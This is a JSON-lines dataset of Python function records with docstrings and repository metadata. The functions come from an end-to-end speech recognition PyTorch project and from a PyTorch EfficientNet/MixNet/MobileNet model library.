{"docstring": "# Fetch data : move data/model to device\n", "func_signal": "def ctc_beam_decode(data, model, device):\n", "code": "name, feat, feat_len, txt = data\nfeat = feat.to(device)\nfeat_len = feat_len.to(device)\n# Decode\nwith torch.no_grad():\n    hyp = model(feat, feat_len)\n\nreturn (name[0], hyp, txt[0]) # Note: bs == 1", "path": "End-to-end-ASR-Pytorch/bin/test_asr.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "# General Settings\n", "func_signal": "def __init__(self, config, paras, mode):\n", "code": "self.config = config\nself.paras = paras\nself.mode = mode\nfor k, v in default_hparas.items():\n    setattr(self, k, v)\nself.device = torch.device(\n    'cuda') if self.paras.gpu and torch.cuda.is_available() else torch.device('cpu')\nself.amp = paras.amp\n\n# Name experiment\nself.exp_name = paras.name\nif self.exp_name is None:\n    # By default, exp is named after config file\n    self.exp_name = paras.config.split('/')[-1].replace('.yaml', '')\n    if mode == 'train':\n        self.exp_name += '_sd{}'.format(paras.seed)\n\n# Plugin list\nself.emb_decoder = None\n\nif mode == 'train':\n    # Filepath setup\n    os.makedirs(paras.ckpdir, exist_ok=True)\n    self.ckpdir = os.path.join(paras.ckpdir, self.exp_name)\n    os.makedirs(self.ckpdir, exist_ok=True)\n\n    # Logger settings\n    self.logdir = os.path.join(paras.logdir, self.exp_name)\n    self.log = SummaryWriter(\n        self.logdir, flush_secs=self.TB_FLUSH_FREQ)\n    self.timer = Timer()\n\n    # Hyperparameters\n    self.step = 0\n    self.valid_step = config['hparas']['valid_step']\n    self.max_step = config['hparas']['max_step']\n\n    self.verbose('Exp. name : {}'.format(self.exp_name))\n    self.verbose('Loading data... large corpus may took a while.')\n\nelif mode == 'test':\n    # Output path\n    os.makedirs(paras.outdir, exist_ok=True)\n    self.ckpdir = os.path.join(paras.outdir, self.exp_name)\n\n    # Load training config to get acoustic feat, text encoder and build model\n    self.src_config = yaml.load(\n        open(config['src']['config'], 'r'), Loader=yaml.FullLoader)\n    self.paras.load = config['src']['ckpt']\n\n    self.verbose('Evaluating result of tr. config @ {}'.format(\n        config['src']['config']))", "path": "End-to-end-ASR-Pytorch/src/solver.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "''' Setup ASR model '''\n# Model\n", "func_signal": "def set_model(self):\n", "code": "init_adadelta = self.config['hparas']['optimizer'] == 'Adadelta'\nself.model = ASR(self.feat_dim, self.vocab_size, init_adadelta, **\n                 self.config['model']).to(self.device)\n\n# Plug-ins\nif ('emb' in self.config) and (self.config['emb']['enable']) \\\n        and (self.config['emb']['fuse'] > 0):\n    from src.plugin import EmbeddingRegularizer\n    self.emb_decoder = EmbeddingRegularizer(\n        self.tokenizer, self.model.dec_dim, **self.config['emb'])\n\n# Load target model in eval mode\nself.load_ckpt()\n\nself.ctc_only = False\nif self.greedy:\n    # Greedy decoding: attention-based if the ASR has a decoder, else use CTC\n    self.decoder = copy.deepcopy(self.model).to(self.device)\nelse:\n    if (not self.model.enable_att) or self.config['decode'].get('ctc_weight', 0.0) == 1.0:\n        # Pure CTC Beam Decoder\n        assert self.config['decode']['beam_size'] <= self.config['decode']['vocab_candidate']\n        self.decoder = CTCBeamDecoder(self.model.to(self.device),\n            [1] + [r for r in range(3, self.vocab_size)],\n            self.config['decode']['beam_size'],\n            self.config['decode']['vocab_candidate'],\n            lm_path=self.config['decode']['lm_path'],\n            lm_config=self.config['decode']['lm_config'],\n            lm_weight=self.config['decode']['lm_weight'],\n            device=self.device)\n        self.ctc_only = True\n    else:\n        # Joint CTC-Attention Beam Decoder\n        self.decoder = BeamDecoder(\n            self.model.cpu(), self.emb_decoder, **self.config['decode'])\n\nself.verbose(self.decoder.create_msg())\ndel self.model\ndel self.emb_decoder", "path": "End-to-end-ASR-Pytorch/bin/test_asr.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "# Note that vocab_list must not contain <pad>, <eos> and <unk>\n# <pad>=0, <eos>=1, <unk>=2\n", "func_signal": "def __init__(self, vocab_list):\n", "code": "self._vocab_list = [\"<pad>\", \"<eos>\", \"<unk>\"] + vocab_list\nself._vocab2idx = {v: idx for idx, v in enumerate(self._vocab_list)}", "path": "End-to-end-ASR-Pytorch/src/text.py", "commit_date": "2020-01-31 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "''' Testing End-to-end ASR system '''\n", "func_signal": "def exec(self):\n", "code": "for s, ds in zip(['dev','test'],[self.dv_set,self.tt_set]):\n    # Setup output\n    self.cur_output_path = self.output_file.format(s,'output')\n    with open(self.cur_output_path,'w',encoding='UTF-8') as f:\n        f.write('idx\\thyp\\ttruth\\n')\n\n    if self.greedy:\n        # Greedy decode\n        self.verbose(\n            'Performing batch-wise greedy decoding on {} set, num of batch = {}.'.format(s, len(ds)))\n        results = self.greedy_decode(ds)\n        self.verbose('Results will be stored at {}'.format(\n            self.cur_output_path))\n        self.write_hyp(results, self.cur_output_path, '-')\n    elif self.ctc_only:\n        # CTC beam decode\n        # Additional output to store all beams\n        self.cur_beam_path = self.output_file.format(s,\n            'beam-{}-{}'.format(self.config['decode']['beam_size'], self.config['decode']['lm_weight']))\n        with open(self.cur_beam_path,'w') as f:\n            f.write('idx\\tbeam\\thyp\\ttruth\\n')\n        self.verbose('Performing instance-wise CTC beam decoding on {} set, num of batch = {}.'.format(s,len(ds)))\n        # Minimal function to pickle\n        ctc_beam_decode_func = partial(ctc_beam_decode, model=copy.deepcopy(self.decoder), device=self.device)\n        # Parallel beam decode\n        results = Parallel(n_jobs=self.paras.njobs)(delayed(ctc_beam_decode_func)(data) for data in tqdm(ds))\n        self.verbose('Results/Beams will be stored at {} / {}'.format(self.cur_output_path,self.cur_beam_path))\n        self.write_hyp(results, self.cur_output_path, self.cur_beam_path)\n    else:\n        # Joint CTC-Attention beam decode\n        # Additional output to store all beams\n        self.cur_beam_path = self.output_file.format(s,\n            'beam-{}-{}'.format(self.config['decode']['beam_size'], self.config['decode']['lm_weight']))\n        with open(self.cur_beam_path, 'w') as f:\n            f.write('idx\\tbeam\\thyp\\ttruth\\n')\n        self.verbose(\n            'Performing instance-wise beam decoding on {} set. (NOTE: use --njobs to speedup)'.format(s))\n        # Minimal function to pickle\n        beam_decode_func = partial(beam_decode, model=copy.deepcopy(\n            self.decoder), device=self.device)\n        # Parallel beam decode\n        results = Parallel(n_jobs=self.paras.njobs)(\n            delayed(beam_decode_func)(data) for data in tqdm(ds))\n        self.verbose(\n            'Results/Beams will be stored at {} / {}.'.format(self.cur_output_path, self.cur_beam_path))\n        self.write_hyp(results, self.cur_output_path,\n                       self.cur_beam_path)\nself.verbose('All done !')", "path": "End-to-end-ASR-Pytorch/bin/test_asr.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "''' Load data for training/validation, store tokenizer and input/output shape'''\n", "func_signal": "def load_data(self):\n", "code": "self.dv_set, self.tt_set, self.feat_dim, self.vocab_size, self.tokenizer, msg = \\\n    load_dataset(self.paras.njobs, self.paras.gpu,\n                 self.paras.pin_memory, False, **self.config['data'])\nself.verbose(msg)", "path": "End-to-end-ASR-Pytorch/bin/test_asr.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "# Reduce vocab size manually\n", "func_signal": "def encode(self, s):\n", "code": "reduced_idx = []\nfor idx in self._tokenizer.encode(s):\n    try:\n        r_idx = idx-BERT_FIRST_IDX\n        assert r_idx > 0\n        reduced_idx.append(r_idx)\n    except:\n        reduced_idx.append(self.unk_idx)\nreduced_idx.append(self.eos_idx)\nreturn reduced_idx", "path": "End-to-end-ASR-Pytorch/src/text.py", "commit_date": "2020-01-31 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "''' Verbose function for updating progress on stdout (do not include newline) '''\n", "func_signal": "def progress(self, msg):\n", "code": "if self.paras.verbose:\n    sys.stdout.write(\"\\033[K\")  # Clear line\n    print('[{}] {}'.format(human_format(self.step), msg), end='\\r')", "path": "End-to-end-ASR-Pytorch/src/solver.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "# Always strip trailing space, \\r and \\n\n", "func_signal": "def encode(self, s):\n", "code": "s = s.strip(\"\\r\\n \")\n# Manually append eos to the end\nreturn [self.vocab_to_idx(v) for v in s] + [self.eos_idx]", "path": "End-to-end-ASR-Pytorch/src/text.py", "commit_date": "2020-01-31 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "'''\nWrite log to TensorBoard\n    log_name  - <str> Name of tensorboard variable \n    log_value - <dict>/<array> Value of variable (e.g. dict of losses), passed if value = None\n'''\n", "func_signal": "def write_log(self, log_name, log_dict):\n", "code": "if type(log_dict) is dict:\n    log_dict = {key: val for key, val in log_dict.items() if (\n        val is not None and not math.isnan(val))}\nif log_dict is None:\n    pass\nelif len(log_dict) > 0:\n    if 'align' in log_name or 'spec' in log_name:\n        img, form = log_dict\n        self.log.add_image(\n            log_name, img, global_step=self.step, dataformats=form)\n    elif 'text' in log_name or 'hyp' in log_name:\n        self.log.add_text(log_name, log_dict, self.step)\n    else:\n        self.log.add_scalars(log_name, log_dict, self.step)", "path": "End-to-end-ASR-Pytorch/src/solver.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "''' Move data to device and compute text seq. length,\n    For Greedy decoding only ( beam_decode & ctc_beam_decode otherwise)'''\n", "func_signal": "def fetch_data(self, data):\n", "code": "_, feat, feat_len, txt = data\nfeat = feat.to(self.device)\nfeat_len = feat_len.to(self.device)\ntxt = txt.to(self.device)\ntxt_len = torch.sum(txt!=0,dim=-1)\n\nreturn feat, feat_len, txt, txt_len", "path": "End-to-end-ASR-Pytorch/bin/test_asr.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "''' Greedy Decoding '''\n", "func_signal": "def greedy_decode(self, dv_set):\n", "code": "results = []\nfor i,data in enumerate(dv_set):\n    self.progress('Valid step - {}/{}'.format(i+1,len(dv_set)))\n    # Fetch data\n    feat, feat_len, txt, txt_len = self.fetch_data(data)\n    # Forward model\n    with torch.no_grad():\n        ctc_output, encode_len, att_output, att_align, dec_state = \\\n            self.decoder( feat, feat_len, int(float(feat_len.max()) * self.config['decode']['max_len_ratio']), \n                            emb_decoder=self.emb_decoder)\n    for j in range(len(txt)):\n        idx = j + self.config['data']['corpus']['batch_size'] * i\n        if att_output is not None:\n            hyp_seqs = att_output[j].argmax(dim=-1).tolist()\n        else:\n            hyp_seqs = ctc_output[j].argmax(dim=-1).tolist()\n        true_txt = txt[j]\n        results.append((str(idx), [hyp_seqs], true_txt))\nreturn results", "path": "End-to-end-ASR-Pytorch/bin/test_asr.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "'''Record decoding results'''\n", "func_signal": "def write_hyp(self, results, best_path, beam_path):\n", "code": "if self.greedy:\n    # Ignores repeated symbols if is decoded with CTC\n    ignore_repeat = not self.decoder.enable_att\nelse:\n    ignore_repeat = False\nfor name, hyp_seqs, truth in tqdm(results):\n    if self.ctc_only and not self.greedy:\n        new_hyp_seqs = [self.tokenizer.decode(hyp, ignore_repeat=False) for hyp in hyp_seqs[:-1]]\n        hyp_seqs = new_hyp_seqs + [self.tokenizer.decode(hyp_seqs[-1], ignore_repeat=True)]\n    else:\n        hyp_seqs = [self.tokenizer.decode(hyp) for hyp in hyp_seqs]\n    \n    truth = self.tokenizer.decode(truth)\n    with open(best_path, 'a') as f:\n        if len(hyp_seqs[0]) == 0:\n            # Set the sequence to a whitespace if it was empty\n            hyp_seqs[0] = ' '\n        f.write('\\t'.join([name, hyp_seqs[0], truth])+'\\n')\n    if not self.greedy:\n        with open(beam_path, 'a', encoding='UTF-8') as f:\n            for b, hyp in enumerate(hyp_seqs):\n                f.write('\\t'.join([name, str(b), hyp, truth])+'\\n')", "path": "End-to-end-ASR-Pytorch/bin/test_asr.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "'''\nStandard backward step with self.timer and debugger\nArguments\n    loss - the loss to perform loss.backward()\n'''\n", "func_signal": "def backward(self, loss):\n", "code": "self.timer.set()\nloss.backward()\ngrad_norm = torch.nn.utils.clip_grad_norm_(\n    self.model.parameters(), self.GRAD_CLIP)\nif math.isnan(grad_norm):\n    self.verbose('Error : grad norm is NaN @ step '+str(self.step))\nelse:\n    self.optimizer.step()\nself.timer.cnt('bw')\nreturn grad_norm", "path": "End-to-end-ASR-Pytorch/src/solver.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "''' Load ckpt if --load option is specified '''\n", "func_signal": "def load_ckpt(self):\n", "code": "if self.paras.load:\n    # Load weights\n    ckpt = torch.load(\n        self.paras.load, map_location=self.device if self.mode == 'train' else 'cpu')\n    self.model.load_state_dict(ckpt['model'])\n    if self.emb_decoder is not None:\n        self.emb_decoder.load_state_dict(ckpt['emb_decoder'])\n    # if self.amp:\n    #    amp.load_state_dict(ckpt['amp'])\n    # Load task-dependent items\n    metric = \"None\"\n    score = 0.0\n    for k, v in ckpt.items():\n        if type(v) is float:\n            metric, score = k, v\n    if self.mode == 'train':\n        self.step = ckpt['global_step']\n        self.optimizer.load_opt_state_dict(ckpt['optimizer'])\n        self.verbose('Load ckpt from {}, restarting at step {} (recorded {} = {:.2f} %)'.format(\n                      self.paras.load, self.step, metric, score))\n    else:\n        self.model.eval()\n        if self.emb_decoder is not None:\n            self.emb_decoder.eval()\n        self.verbose('Evaluation target = {} (recorded {} = {:.2f} %)'.format(self.paras.load, metric, score))", "path": "End-to-end-ASR-Pytorch/src/solver.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "Alexander-H-Liu/End-to-end-ASR-Pytorch", "stars": 1150, "license": "mit", "language": "python", "size": 943}
{"docstring": "\"\"\" MNASNet A1 (w/ SE),  depth multiplier of 0.75. \"\"\"\n", "func_signal": "def semnasnet_075(pretrained=False, **kwargs):\n", "code": "model = _gen_mnasnet_a1('semnasnet_075', 0.75, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\"Creates a mnasnet-b1 model.\n\nRef impl: https://github.com/tensorflow/tpu/tree/master/models/official/mnasnet\nPaper: https://arxiv.org/pdf/1807.11626.pdf.\n\nArgs:\n  channel_multiplier: multiplier to number of channels per layer.\n\"\"\"\n", "func_signal": "def _gen_mnasnet_small(variant, channel_multiplier=1.0, pretrained=False, **kwargs):\n", "code": "arch_def = [\n    ['ds_r1_k3_s1_c8'],\n    ['ir_r1_k3_s2_e3_c16'],\n    ['ir_r2_k3_s2_e6_c16'],\n    ['ir_r4_k5_s2_e6_c32_se0.25'],\n    ['ir_r3_k3_s1_e6_c32_se0.25'],\n    ['ir_r3_k5_s2_e6_c88_se0.25'],\n    ['ir_r1_k3_s1_e6_c144']\n]\nwith layer_config_kwargs(kwargs):\n    model_kwargs = dict(\n        block_args=decode_arch_def(arch_def),\n        stem_size=8,\n        channel_multiplier=channel_multiplier,\n        act_layer=resolve_act_layer(kwargs, 'relu'),\n        norm_kwargs=resolve_bn_args(kwargs),\n        **kwargs\n    )\n    model = _create_model(model_kwargs, variant, pretrained)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" MobileNet V2 w/ 1.4 channel multiplier \"\"\"\n", "func_signal": "def mobilenetv2_140(pretrained=False, **kwargs):\n", "code": "model = _gen_mobilenet_v2('mobilenetv2_140', 1.4, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\"Creates a MixNet Small model. Tensorflow compatible variant\n\"\"\"\n", "func_signal": "def tf_mixnet_s(pretrained=False, **kwargs):\n", "code": "kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nkwargs['pad_type'] = 'same'\nmodel = _gen_mixnet_s(\n    'tf_mixnet_s', channel_multiplier=1.0, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" EfficientNet-B3 \"\"\"\n# NOTE for train set drop_rate=0.3, drop_connect_rate=0.2\n", "func_signal": "def efficientnet_b3(pretrained=False, **kwargs):\n", "code": "model = _gen_efficientnet(\n    'efficientnet_b3', channel_multiplier=1.2, depth_multiplier=1.4, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" EfficientNet-B5 AdvProp. Tensorflow compatible variant\nPaper: Adversarial Examples Improve Image Recognition (https://arxiv.org/abs/1911.09665)\n\"\"\"\n", "func_signal": "def tf_efficientnet_b5_ap(pretrained=False, **kwargs):\n", "code": "kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nkwargs['pad_type'] = 'same'\nmodel = _gen_efficientnet(\n    'tf_efficientnet_b5_ap', channel_multiplier=1.6, depth_multiplier=2.2, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\"Creates a MixNet Large model.\n\"\"\"\n# NOTE for train set drop_rate=0.25\n", "func_signal": "def mixnet_l(pretrained=False, **kwargs):\n", "code": "model = _gen_mixnet_m(\n    'mixnet_l', channel_multiplier=1.3, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" EfficientNet-B2 AdvProp. Tensorflow compatible variant\nPaper: Adversarial Examples Improve Image Recognition (https://arxiv.org/abs/1911.09665)\n\"\"\"\n", "func_signal": "def tf_efficientnet_b2_ap(pretrained=False, **kwargs):\n", "code": "kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nkwargs['pad_type'] = 'same'\nmodel = _gen_efficientnet(\n    'tf_efficientnet_b2_ap', channel_multiplier=1.1, depth_multiplier=1.2, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" EfficientNet-L2 NoisyStudent. Tensorflow compatible variant\nPaper: Self-training with Noisy Student improves ImageNet classification (https://arxiv.org/abs/1911.04252)\n\"\"\"\n# NOTE for train, drop_rate should be 0.5\n", "func_signal": "def tf_efficientnet_l2_ns(pretrained=False, **kwargs):\n", "code": "kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nkwargs['pad_type'] = 'same'\nmodel = _gen_efficientnet(\n    'tf_efficientnet_l2_ns', channel_multiplier=4.3, depth_multiplier=5.3, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" EfficientNet-B5 NoisyStudent. Tensorflow compatible variant\nPaper: Self-training with Noisy Student improves ImageNet classification (https://arxiv.org/abs/1911.04252)\n\"\"\"\n", "func_signal": "def tf_efficientnet_b5_ns(pretrained=False, **kwargs):\n", "code": "kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nkwargs['pad_type'] = 'same'\nmodel = _gen_efficientnet(\n    'tf_efficientnet_b5_ns', channel_multiplier=1.6, depth_multiplier=2.2, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" EfficientNet-CondConv-B0 w/ 8 Experts \"\"\"\n", "func_signal": "def tf_efficientnet_cc_b0_8e(pretrained=False, **kwargs):\n", "code": "kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nkwargs['pad_type'] = 'same'\nmodel = _gen_efficientnet_condconv(\n    'tf_efficientnet_cc_b0_8e', channel_multiplier=1.0, depth_multiplier=1.0, experts_multiplier=2,\n    pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" MobileNet V2 w/ 1.1 channel, 1.2 depth multipliers\"\"\"\n", "func_signal": "def mobilenetv2_110d(pretrained=False, **kwargs):\n", "code": "model = _gen_mobilenet_v2(\n    'mobilenetv2_110d', 1.1, depth_multiplier=1.2, fix_stem_head=True, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" EfficientNet-Lite0. Tensorflow compatible variant  \"\"\"\n", "func_signal": "def tf_efficientnet_lite0(pretrained=False, **kwargs):\n", "code": "kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nkwargs['pad_type'] = 'same'\nmodel = _gen_efficientnet_lite(\n    'tf_efficientnet_lite0', channel_multiplier=1.0, depth_multiplier=1.0, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\"Creates an EfficientNet model.\n\nRef impl: https://github.com/tensorflow/tpu/blob/master/models/official/efficientnet/efficientnet_model.py\nPaper: https://arxiv.org/abs/1905.11946\n\nEfficientNet params\nname: (channel_multiplier, depth_multiplier, resolution, dropout_rate)\n'efficientnet-b0': (1.0, 1.0, 224, 0.2),\n'efficientnet-b1': (1.0, 1.1, 240, 0.2),\n'efficientnet-b2': (1.1, 1.2, 260, 0.3),\n'efficientnet-b3': (1.2, 1.4, 300, 0.3),\n'efficientnet-b4': (1.4, 1.8, 380, 0.4),\n'efficientnet-b5': (1.6, 2.2, 456, 0.4),\n'efficientnet-b6': (1.8, 2.6, 528, 0.5),\n'efficientnet-b7': (2.0, 3.1, 600, 0.5),\n'efficientnet-b8': (2.2, 3.6, 672, 0.5),\n\nArgs:\n  channel_multiplier: multiplier to number of channels per layer\n  depth_multiplier: multiplier to number of repeats per stage\n\n\"\"\"\n", "func_signal": "def _gen_efficientnet(variant, channel_multiplier=1.0, depth_multiplier=1.0, pretrained=False, **kwargs):\n", "code": "arch_def = [\n    ['ds_r1_k3_s1_e1_c16_se0.25'],\n    ['ir_r2_k3_s2_e6_c24_se0.25'],\n    ['ir_r2_k5_s2_e6_c40_se0.25'],\n    ['ir_r3_k3_s2_e6_c80_se0.25'],\n    ['ir_r3_k5_s1_e6_c112_se0.25'],\n    ['ir_r4_k5_s2_e6_c192_se0.25'],\n    ['ir_r1_k3_s1_e6_c320_se0.25'],\n]\nwith layer_config_kwargs(kwargs):\n    model_kwargs = dict(\n        block_args=decode_arch_def(arch_def, depth_multiplier),\n        num_features=round_channels(1280, channel_multiplier, 8, None),\n        stem_size=32,\n        channel_multiplier=channel_multiplier,\n        act_layer=resolve_act_layer(kwargs, 'swish'),\n        norm_kwargs=resolve_bn_args(kwargs),\n        **kwargs,\n    )\n    model = _create_model(model_kwargs, variant, pretrained)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\"Round number of filters based on depth multiplier.\"\"\"\n", "func_signal": "def round_channels(channels, multiplier=1.0, divisor=8, channel_min=None):\n", "code": "if not multiplier:\n    return channels\nchannels *= multiplier\nreturn make_divisible(channels, divisor, channel_min)", "path": "gen-efficientnet-pytorch/geffnet/efficientnet_builder.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" EfficientNet-B8 AdvProp. Tensorflow compatible variant\nPaper: Adversarial Examples Improve Image Recognition (https://arxiv.org/abs/1911.09665)\n\"\"\"\n# NOTE for train, drop_rate should be 0.5\n", "func_signal": "def tf_efficientnet_b8_ap(pretrained=False, **kwargs):\n", "code": "kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nkwargs['pad_type'] = 'same'\nmodel = _gen_efficientnet(\n    'tf_efficientnet_b8_ap', channel_multiplier=2.2, depth_multiplier=3.6, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\"Computes the precision@k for the specified values of k\"\"\"\n", "func_signal": "def accuracy(output, target, topk=(1,)):\n", "code": "maxk = max(topk)\nbatch_size = target.size(0)\n\n_, pred = output.topk(maxk, 1, True, True)\npred = pred.t()\ncorrect = pred.eq(target.view(1, -1).expand_as(pred))\n\nres = []\nfor k in topk:\n    correct_k = correct[:k].reshape(-1).float().sum(0)\n    res.append(correct_k.mul_(100.0 / batch_size))\nreturn res", "path": "gen-efficientnet-pytorch/utils.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" EfficientNet-Lite4. Tensorflow compatible variant \"\"\"\n", "func_signal": "def tf_efficientnet_lite4(pretrained=False, **kwargs):\n", "code": "kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nkwargs['pad_type'] = 'same'\nmodel = _gen_efficientnet_lite(\n    'tf_efficientnet_lite4', channel_multiplier=1.4, depth_multiplier=1.8, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\" FBNet-C \"\"\"\n", "func_signal": "def fbnetc_100(pretrained=False, **kwargs):\n", "code": "if pretrained:\n    # pretrained model trained with non-default BN epsilon\n    kwargs['bn_eps'] = BN_EPS_TF_DEFAULT\nmodel = _gen_fbnetc('fbnetc_100', 1.0, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
